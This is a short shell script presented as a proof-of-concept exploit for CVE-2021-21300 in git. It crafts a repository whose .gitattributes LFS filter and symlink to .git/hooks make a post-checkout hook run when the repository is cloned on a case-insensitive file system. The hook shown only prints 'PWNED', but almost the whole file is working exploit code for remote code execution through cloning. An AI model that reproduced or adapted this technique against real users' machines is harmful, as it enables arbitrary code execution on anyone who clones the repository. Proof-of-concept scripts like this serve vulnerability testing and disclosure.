#!/bin/sh
# --------------
# CVE-2021-21300
# --------------
# Source: https://www.openwall.com/lists/oss-security/2021/03/09/3

rm -rf delayed-checkout cloned # cleanup

# Exploit (run inside case insensitive file system)
git init delayed-checkout &&
(
	cd delayed-checkout &&
	git config user.name "Your Name" &&
	git config user.email "you@example.com" &&
	echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
		>.gitattributes &&
	mkdir A &&
	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
	chmod +x A/post-checkout &&
	>A/a &&
	>A/b &&
	git add -A &&
	rm -rf A &&
	ln -s .git/hooks a &&
	git add a &&
	git commit -m initial
) &&

git clone delayed-checkout cloned
